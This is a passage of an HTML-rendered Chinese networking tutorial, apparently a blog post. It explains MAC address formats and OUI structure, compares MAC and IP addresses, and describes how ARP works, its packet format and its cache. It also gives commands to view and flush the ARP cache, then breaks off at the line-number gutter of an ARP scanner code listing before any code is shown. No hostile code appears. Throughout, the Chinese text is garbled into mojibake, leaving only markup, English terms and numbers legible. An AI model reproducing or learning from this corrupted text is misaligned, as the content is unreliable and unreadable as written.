class_">Windows</span>ï¼‰<br>   <span class="hljs-variable constant_">AA</span>-<span class="hljs-variable constant_">BB</span>-<span class="hljs-variable constant_">CC</span>-<span class="hljs-variable constant_">DD</span>-<span class="hljs-variable constant_">EE</span>-<span class="hljs-variable constant_">FF</span><br><br><span class="hljs-number">3</span>. ç‚¹åˆ†éš”ï¼ˆ<span class="hljs-title class_">Cisco</span>ï¼‰<br>   <span class="hljs-variable constant_">AABB</span>.<span class="hljs-variable constant_">CCDD</span>.<span class="hljs-variable constant_">EEFF</span><br><br><span class="hljs-number">4</span>. è¿ç»­ï¼ˆæ— åˆ†éš”ç¬¦ï¼‰<br>   <span class="hljs-variable constant_">AABBCCDDEEFF</span><br><br>éƒ½æ˜¯åŒä¸€ä¸ª<span class="hljs-variable constant_">MAC</span>åœ°å€ï¼<br></code></pre></td></tr></table></figure><h3 id="MACåœ°å€ç»“æ„">MACåœ°å€ç»“æ„</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs markdown">MACåœ°å€åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼š<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  OUI (24ä½)     â”‚  è®¾å¤‡æ ‡è¯†(24ä½) â”‚<br>â”‚  å‚å•†æ ‡è¯†       â”‚  åºåˆ—å·         â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>  AA:BB:CC         DD:EE:FF<br><br>OUIï¼ˆOrganizationally Unique Identifierï¼‰ï¼š<br><span class="hljs-bullet">-</span> å‰3ä¸ªå­—èŠ‚ï¼ˆ24ä½ï¼‰<br><span class="hljs-bullet">-</span> IEEEåˆ†é…ç»™å‚å•†çš„å”¯ä¸€æ ‡è¯†<br><span class="hljs-bullet">-</span> ä¾‹å¦‚ï¼š<br><span class="hljs-bullet">  -</span> 00:50:56 â†’ VMwareè™šæ‹Ÿç½‘å¡<br><span class="hljs-bullet">  -</span> 00:1C:42 â†’ Parallelsè™šæ‹Ÿç½‘å¡<br><span class="hljs-bullet">  -</span> DC:A6:32 â†’ Raspberry Pi<br><span class="hljs-bullet">  -</span> 3C:A9:F4 â†’ å°ç±³è®¾å¤‡<br><br>è®¾å¤‡æ ‡è¯†ï¼š<br><span class="hljs-bullet">-</span> å3ä¸ªå­—èŠ‚ï¼ˆ24ä½ï¼‰<br><span class="hljs-bullet">-</span> å‚å•†è‡ªè¡Œåˆ†é…çš„åºåˆ—å·<br><span class="hljs-bullet">-</span> ç†è®ºä¸Šå¯äº§ç”Ÿ 2^24 = 16,777,216 ä¸ªåœ°å€<br></code></pre></td></tr></table></figure><h3 id="ç‰¹æ®ŠMACåœ°å€">ç‰¹æ®ŠMACåœ°å€</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-number">1</span>. å¹¿æ’­<span class="hljs-variable constant_">MAC</span>åœ°å€<br>   <span class="hljs-variable constant_">FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><br>   ç”¨äºå‘å±€åŸŸç½‘å†…æ‰€æœ‰è®¾å¤‡å‘é€æ•°æ®<br><br><span class="hljs-number">2</span>. ç»„æ’­<span class="hljs-variable constant_">MAC</span>åœ°å€<br>   ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æœ€ä½ä½ä¸º<span class="hljs-number">1</span><br>   ä¾‹å¦‚ï¼š<span class="hljs-number">01</span><span class="hljs-symbol">:</span><span class="hljs-number">00</span><span class="hljs-symbol">:</span>5<span class="hljs-symbol">E:</span><span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:XX</span><span class="hljs-symbol">:XX</span>ï¼ˆ<span class="hljs-title class_">IPv4</span>ç»„æ’­ï¼‰<br><br><span class="hljs-number">3</span>. å•æ’­<span class="hljs-variable constant_">MAC</span>åœ°å€<br>   ç¬¬ä¸€ä¸ªå­—èŠ‚çš„æœ€ä½ä½ä¸º<span class="hljs-number">0</span><br>   æ™®é€šçš„è®¾å¤‡åœ°å€<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-MACåœ°å€-vs-IPåœ°å€">ğŸ” MACåœ°å€ vs IPåœ°å€</h2><h3 id="å¯¹æ¯”è¡¨">å¯¹æ¯”è¡¨</h3><table><thead><tr><th>ç‰¹æ€§</th><th>MACåœ°å€</th><th>IPåœ°å€</th></tr></thead><tbody><tr><td>å±‚æ¬¡</td><td>æ•°æ®é“¾è·¯å±‚ï¼ˆç¬¬2å±‚ï¼‰</td><td>ç½‘ç»œå±‚ï¼ˆç¬¬3å±‚ï¼‰</td></tr><tr><td>é•¿åº¦</td><td>48ä½ï¼ˆ6å­—èŠ‚ï¼‰</td><td>32ä½ï¼ˆIPv4ï¼‰æˆ–128ä½ï¼ˆIPv6ï¼‰</td></tr><tr><td>è¡¨ç¤º</td><td>åå…­è¿›åˆ¶</td><td>åè¿›åˆ¶ï¼ˆç‚¹åˆ†ï¼‰</td></tr><tr><td>åˆ†é…</td><td>å‚å•†åˆ†é…ï¼Œå›ºåŒ–åœ¨ç¡¬ä»¶</td><td>ç½‘ç»œç®¡ç†å‘˜æˆ–DHCPåˆ†é…</td></tr><tr><td>å”¯ä¸€æ€§</td><td>å…¨çƒå”¯ä¸€</td><td>ç½‘ç»œå†…å”¯ä¸€</td></tr><tr><td>å¯å˜æ€§</td><td>ç†è®ºä¸Šä¸å¯å˜</td><td>å¯ä»¥æ›´æ¢</td></tr><tr><td>ä½œç”¨èŒƒå›´</td><td>å±€åŸŸç½‘å†…</td><td>å¯è·¨è¶Šå¤šä¸ªç½‘ç»œ</td></tr><tr><td>è·¯ç”±</td><td>ä¸èƒ½è·¯ç”±</td><td>å¯ä»¥è·¯ç”±</td></tr></tbody></table><h3 id="ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªåœ°å€ï¼Ÿ">ä¸ºä»€ä¹ˆéœ€è¦ä¸¤ä¸ªåœ°å€ï¼Ÿ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ç±»æ¯”ï¼šå¿«é€’ç³»ç»Ÿ<br><br>MACåœ°å€ = æ¥¼å±‚å’Œæˆ¿é—´å·<br><span class="hljs-bullet">-</span> åœ¨ä¸€æ ‹æ¥¼å†…æ‰¾åˆ°å…·ä½“æˆ¿é—´<br><span class="hljs-bullet">-</span> åªåœ¨æœ¬æ¥¼æœ‰æ•ˆ<br><span class="hljs-bullet">-</span> å›ºå®šä¸å˜<br><br>IPåœ°å€ = åŸå¸‚å’Œè¡—é“åœ°å€<br><span class="hljs-bullet">-</span> è·¨åŸå¸‚å¯»æ‰¾ç›®æ ‡<br><span class="hljs-bullet">-</span> å¯ä»¥æ¬å®¶ï¼ˆæ›´æ¢ç½‘ç»œï¼‰<br><span class="hljs-bullet">-</span> å¯å˜<br><br>è¿‡ç¨‹ï¼š<br><span class="hljs-bullet">1.</span> å¿«é€’å…ˆé€šè¿‡åŸå¸‚åœ°å€æ‰¾åˆ°ç›®æ ‡åŸå¸‚ï¼ˆIPè·¯ç”±ï¼‰<br><span class="hljs-bullet">2.</span> åˆ°è¾¾åé€šè¿‡æ¥¼å±‚æˆ¿é—´å·æ‰¾åˆ°å…·ä½“ä½ç½®ï¼ˆMACå¯»å€ï¼‰<br></code></pre></td></tr></table></figure><h3 id="æ•°æ®ä¼ è¾“è¿‡ç¨‹">æ•°æ®ä¼ è¾“è¿‡ç¨‹</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs armasm">åŒ—äº¬çš„ç”µè„‘A â†’ ä¸Šæµ·çš„ç”µè„‘<span class="hljs-keyword">B</span><br><br><span class="hljs-number">1</span>. åº”ç”¨å±‚ï¼šç”Ÿæˆæ•°æ®<br><span class="hljs-number">2</span>. ä¼ è¾“å±‚ï¼šæ·»åŠ ç«¯å£å·<br><span class="hljs-number">3</span>. ç½‘ç»œå±‚ï¼šæ·»åŠ <span class="hljs-built_in">IP</span>åœ°å€<br>   æº<span class="hljs-built_in">IP</span>ï¼šåŒ—äº¬Açš„<span class="hljs-built_in">IP</span><br>   ç›®æ ‡<span class="hljs-built_in">IP</span>ï¼šä¸Šæµ·Bçš„<span class="hljs-built_in">IP</span><br><span class="hljs-number">4</span>. æ•°æ®é“¾è·¯å±‚ï¼šæ·»åŠ MACåœ°å€<br>   æºMACï¼šå½“å‰è·¯ç”±å™¨çš„MAC<br>   ç›®æ ‡MACï¼šä¸‹ä¸€è·³è·¯ç”±å™¨çš„MAC<br><br>é‡ç‚¹ï¼š<br>- <span class="hljs-built_in">IP</span>åœ°å€ä»å¤´åˆ°å°¾ä¸å˜ï¼ˆåŒ—äº¬A â†’ ä¸Šæµ·Bï¼‰<br>- MACåœ°å€æ¯ä¸€è·³éƒ½ä¼šå˜åŒ–ï¼ˆæ¯æ®µé“¾è·¯ä½¿ç”¨ä¸åŒçš„MACï¼‰<br></code></pre></td></tr></table></figure><h2 id="ğŸ“¡-ARPåè®®">ğŸ“¡ ARPåè®®</h2><h3 id="ä»€ä¹ˆæ˜¯ARPï¼Ÿ">ä»€ä¹ˆæ˜¯ARPï¼Ÿ</h3><p><strong>ARP</strong>ï¼ˆAddress Resolution Protocolï¼Œåœ°å€è§£æåè®®ï¼‰ç”¨äºå°†IPåœ°å€è½¬æ¢ä¸ºMACåœ°å€ã€‚</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">é—®é¢˜ï¼šæˆ‘çŸ¥é“ç›®æ ‡çš„<span class="hljs-variable constant_">IP</span>åœ°å€ï¼Œä½†è¦å‘é€æ•°æ®éœ€è¦<span class="hljs-variable constant_">MAC</span>åœ°å€<br><br><span class="hljs-variable constant_">ARP</span>çš„ä½œç”¨ï¼š<br><span class="hljs-variable constant_">IP</span>åœ°å€ï¼ˆ<span class="hljs-number">192.168</span>.<span class="hljs-number">1.100</span>ï¼‰ â†’ <span class="hljs-variable constant_">ARP</span>æŸ¥è¯¢ â†’ <span class="hljs-variable constant_">MAC</span>åœ°å€ï¼ˆ<span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:CC</span><span class="hljs-symbol">:DD</span><span class="hljs-symbol">:EE</span><span class="hljs-symbol">:FF</span>ï¼‰<br></code></pre></td></tr></table></figure><h3 id="ARPå·¥ä½œåŸç†">ARPå·¥ä½œåŸç†</h3><h4 id="åœºæ™¯ï¼šä¸»æœºAï¼ˆ192-168-1-10ï¼‰è¦å‘é€æ•°æ®ç»™ä¸»æœºBï¼ˆ192-168-1-20ï¼‰">åœºæ™¯ï¼šä¸»æœºAï¼ˆ192.168.1.10ï¼‰è¦å‘é€æ•°æ®ç»™ä¸»æœºBï¼ˆ192.168.1.20ï¼‰</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ruby">æ­¥éª¤<span class="hljs-number">1</span>ï¼šæ£€æŸ¥<span class="hljs-variable constant_">ARP</span>ç¼“å­˜<br>ä¸»æœºAé¦–å…ˆæŸ¥çœ‹æœ¬åœ°<span class="hljs-variable constant_">ARP</span>ç¼“å­˜è¡¨<br>- å¦‚æœæœ‰<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>çš„<span class="hljs-variable constant_">MAC</span>åœ°å€ â†’ ç›´æ¥ä½¿ç”¨<br>- å¦‚æœæ²¡æœ‰ â†’ å‘é€<span class="hljs-variable constant_">ARP</span>è¯·æ±‚<br><br>æ­¥éª¤<span class="hljs-number">2</span>ï¼šå‘é€<span class="hljs-variable constant_">ARP</span>è¯·æ±‚ï¼ˆå¹¿æ’­ï¼‰<br>ä¸»æœºAå‘é€å¹¿æ’­åŒ…ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ è°æ˜¯<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>ï¼Ÿ                  â”‚<br>â”‚ è¯·å‘Šè¯‰<span class="hljs-number">192.168</span>.<span class="hljs-number">1.10</span>                  â”‚<br>â”‚ æˆ‘çš„<span class="hljs-variable constant_">MAC</span>æ˜¯<span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span>          â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>ç›®æ ‡<span class="hljs-variable constant_">MAC</span>ï¼š<span class="hljs-variable constant_">FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span><span class="hljs-symbol">:FF</span>ï¼ˆå¹¿æ’­ï¼‰<br><br>æ­¥éª¤<span class="hljs-number">3</span>ï¼šæ‰€æœ‰ä¸»æœºæ¥æ”¶<br>å±€åŸŸç½‘å†…æ‰€æœ‰ä¸»æœºéƒ½æ”¶åˆ°è¿™ä¸ªå¹¿æ’­åŒ…<br>- ä¸»æœºBï¼šè¿™æ˜¯é—®æˆ‘çš„ï¼<br>- å…¶ä»–ä¸»æœºï¼šä¸æ˜¯é—®æˆ‘çš„ï¼Œä¸¢å¼ƒ<br><br>æ­¥éª¤<span class="hljs-number">4</span>ï¼šä¸»æœºBå‘é€<span class="hljs-variable constant_">ARP</span>å“åº”ï¼ˆå•æ’­ï¼‰<br>ä¸»æœºBå›å¤ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ æˆ‘æ˜¯<span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span>                    â”‚<br>â”‚ æˆ‘çš„<span class="hljs-variable constant_">MAC</span>æ˜¯<span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span>          â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>ç›®æ ‡<span class="hljs-variable constant_">MAC</span>ï¼š<span class="hljs-variable constant_">AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span><span class="hljs-symbol">:AA</span>ï¼ˆå•æ’­ç»™Aï¼‰<br><br>æ­¥éª¤<span class="hljs-number">5</span>ï¼šä¸»æœºAæ›´æ–°<span class="hljs-variable constant_">ARP</span>ç¼“å­˜<br>ä¸»æœºAè®°å½•ï¼š<br><span class="hljs-number">192.168</span>.<span class="hljs-number">1.20</span> â†’ <span class="hljs-variable constant_">BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><span class="hljs-symbol">:BB</span><br><br>æ­¥éª¤<span class="hljs-number">6</span>ï¼šå¼€å§‹é€šä¿¡<br>ç°åœ¨ä¸»æœºAçŸ¥é“äº†ä¸»æœºBçš„<span class="hljs-variable constant_">MAC</span>åœ°å€ï¼Œå¯ä»¥å‘é€æ•°æ®äº†<br></code></pre></td></tr></table></figure><h3 id="ARPæŠ¥æ–‡æ ¼å¼">ARPæŠ¥æ–‡æ ¼å¼</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs abnf">ARPè¯·æ±‚/å“åº”æŠ¥æ–‡ï¼š<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚ ç¡¬ä»¶ç±»å‹ï¼ˆ<span class="hljs-number">2</span>å­—èŠ‚ï¼‰                  â”‚ <span class="hljs-number">1</span> <span class="hljs-operator">=</span> ä»¥å¤ªç½‘<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ åè®®ç±»å‹ï¼ˆ<span class="hljs-number">2</span>å­—èŠ‚ï¼‰                  â”‚ <span class="hljs-number">0</span>x0800 <span class="hljs-operator">=</span> IP<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ ç¡¬ä»¶åœ°å€é•¿åº¦ï¼ˆ<span class="hljs-number">1</span>å­—èŠ‚ï¼‰              â”‚ <span class="hljs-number">6</span> <span class="hljs-operator">=</span> MACåœ°å€<span class="hljs-number">6</span>å­—èŠ‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ åè®®åœ°å€é•¿åº¦ï¼ˆ<span class="hljs-number">1</span>å­—èŠ‚ï¼‰              â”‚ <span class="hljs-number">4</span> <span class="hljs-operator">=</span> IPåœ°å€<span class="hljs-number">4</span>å­—èŠ‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ æ“ä½œç ï¼ˆ<span class="hljs-number">2</span>å­—èŠ‚ï¼‰                    â”‚ <span class="hljs-number">1</span><span class="hljs-operator">=</span>è¯·æ±‚ï¼Œ<span class="hljs-number">2</span><span class="hljs-operator">=</span>å“åº”<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ å‘é€æ–¹MACåœ°å€ï¼ˆ<span class="hljs-number">6</span>å­—èŠ‚ï¼‰             â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ å‘é€æ–¹IPåœ°å€ï¼ˆ<span class="hljs-number">4</span>å­—èŠ‚ï¼‰              â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ ç›®æ ‡MACåœ°å€ï¼ˆ<span class="hljs-number">6</span>å­—èŠ‚ï¼‰               â”‚ è¯·æ±‚æ—¶ä¸ºå…¨<span class="hljs-number">0</span><br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ ç›®æ ‡IPåœ°å€ï¼ˆ<span class="hljs-number">4</span>å­—èŠ‚ï¼‰                â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="ARPç¼“å­˜">ARPç¼“å­˜</h3><p>ä¸ºäº†æé«˜æ•ˆç‡ï¼Œç³»ç»Ÿä¼šç¼“å­˜ARPè§£æçš„ç»“æœã€‚</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">ARPç¼“å­˜è¡¨ç¤ºä¾‹ï¼š<br><br>IPåœ°å€           MACåœ°å€              ç±»å‹     è¿‡æœŸæ—¶é—´<br><span class="hljs-number">192.168.1.1</span>     AA:BB:CC:DD:EE:FF    åŠ¨æ€     <span class="hljs-number">120</span>ç§’<br><span class="hljs-number">192.168.1.20</span>    <span class="hljs-number">11</span>:<span class="hljs-number">22</span>:<span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">66</span>    åŠ¨æ€     <span class="hljs-number">120</span>ç§’<br><span class="hljs-number">192.168.1.100</span>   FF:EE:DD:CC:BB:AA    é™æ€     æ°¸ä¹…<br><br>ç±»å‹ï¼š<br>- åŠ¨æ€ï¼šé€šè¿‡ARPåè®®è‡ªåŠ¨å­¦ä¹ ï¼Œæœ‰è¿‡æœŸæ—¶é—´<br>- é™æ€ï¼šæ‰‹åŠ¨é…ç½®ï¼Œæ°¸ä¹…æœ‰æ•ˆ<br></code></pre></td></tr></table></figure><h3 id="æŸ¥çœ‹ARPç¼“å­˜">æŸ¥çœ‹ARPç¼“å­˜</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Windows</span><br>arp -a<br><br><span class="hljs-comment"># Linux/Mac</span><br>arp -n<br><br><span class="hljs-comment"># æŸ¥çœ‹ç‰¹å®šIPçš„MAC</span><br>arp -n 192.168.1.1<br><br><span class="hljs-comment"># æ¸…ç©ºARPç¼“å­˜ï¼ˆéœ€è¦ç®¡ç†å‘˜æƒé™ï¼‰</span><br><span class="hljs-comment"># Windows</span><br>arp -d<br><br><span class="hljs-comment"># Linux</span><br><span class="hljs-built_in">sudo</span> ip -s -s neigh flush all<br><br><span class="hljs-comment"># Mac</span><br><span class="hljs-built_in">sudo</span> arp -d -a<br></code></pre></td></tr></table></figure><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šARPæ‰«æå·¥å…·">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šARPæ‰«æå·¥å…·</h2><p>è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªARPæ‰«æå·¥å…·ï¼Œç”¨äºå‘ç°å±€åŸŸç½‘å†…çš„æ‰€æœ‰è®¾å¤‡ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span 